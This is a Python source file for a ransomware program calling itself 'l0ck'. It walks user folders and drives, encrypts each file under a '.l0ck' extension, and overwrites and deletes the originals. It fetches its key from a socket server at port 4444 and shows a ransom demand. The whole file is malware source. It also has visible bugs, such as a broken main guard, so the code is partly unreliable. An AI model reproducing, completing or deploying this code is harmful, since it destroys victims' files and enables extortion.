from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from threading import Thread
from tkinter import messagebox
import hashlib
import os
import socket
#import publicip
import base64

rootdir = ""
PATHS = []
id = b''
key=''
salt = b''

#kdf = PBKDF2HMAC(
#    #salt=b'K\x8d\xb9\x86\xf7\x11\\\x14\xe8\x84\x16l\x8d+X\xe3',
#    salt=salt,
#    algorithm=hashes.SHA256(),
#    length=32,
#    iterations=10000,
#)

def gen_id(file):
    checksum = hashlib.md5()
    with open(file,'rb') as f:
        filedata = f.read()
        checksum.update(filedata)
        md5code = checksum.hexdigest()
        return md5code


def encrypt(path,key):
    fernet = Fernet(key)
    filename = os.path.basename(path)
    file = open(path,'rb')
    output_name = filename+'.l0ck'
    output_file_path = path.replace(filename,output_name)
    filedata=file.read()
    file.close()
    encrypted = fernet.encrypt(filedata)
    try:
        efile = open(output_file_path,'wb')
        efile.write(encrypted)
        efile.close()
    except:
        pass



def GETKEY(id):
    sok = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    while True:
        try:
            sok.connect(("127.0.0.1",4444))
            sok.send(id.encode())
            key = sok.recv(2048+1024+1024)
            return key
        except ConnectionRefusedError:
            continue



def getFile():
    if os.name.lower() == 'nt':
        WIN_ROOT_PATHS = ['C:\\Users\\'+os.getlogin()+'\\']
        DRIVES_LETTER = 'ABDEFGHIKKLMNOPQRSTUVWXYZ'
        for drive in DRIVES_LETTER:
            if os.path.exists('{}:\\'.format(drive)):
                WIN_ROOT_PATHS.append('{}:\\'.format(drive))
        for path in WIN_ROOT_PATHS:
            for r,d,f in os.walk(path):
                for files in f:
                    PATHS.append(os.path.join(r,files))
            logfile = open('log.log','w+')
            strfile = ''
            logfile.write(strfile.join(PATHS))
            logfile.close()
    else:
        LINUX_ROOT_PATHS = ['/home/'+os.getlogin()+'/Desktop','/media/'+os.getlogin()+'/']
        for path in LINUX_ROOT_PATHS:
            for r,d,f in os.walk(path):
                for files in f:
                    PATHS.append(os.path.join(r,files))
            logfile = open('log.log','w+')
            strfile = ''
            logfile.write(strfile.join(PATHS))
            logfile.close()

def secure_del(file):
    try:
        delfile = open(file,'wb')
        delfile.write(os.urandom(delfile.tell()))
        delfile.close()
        os.unlink(file)
    except:
        pass



def kaboom(key):
    for file in PATHS:
        encrypt(file,key)
        secure_del(file)


def msgbox():
    messagebox.showerror(title="l0ck", message="You've been hit by l0ck rensomeware.\nYour all data has been encrypted.\nBuy the key to decrypt your data.")

if _name_ == '_main_':
    getFile()
    id = gen_id('log.log')
    keySalt = GETKEY(id)
    key = keySalt.rsplit('SALT'.encode())[0]
    salt = keySalt.rsplit('SALT'.encode())[1]
    mal = Thread(target=kaboom,args=(key,))
    mal.start()
    msgbox()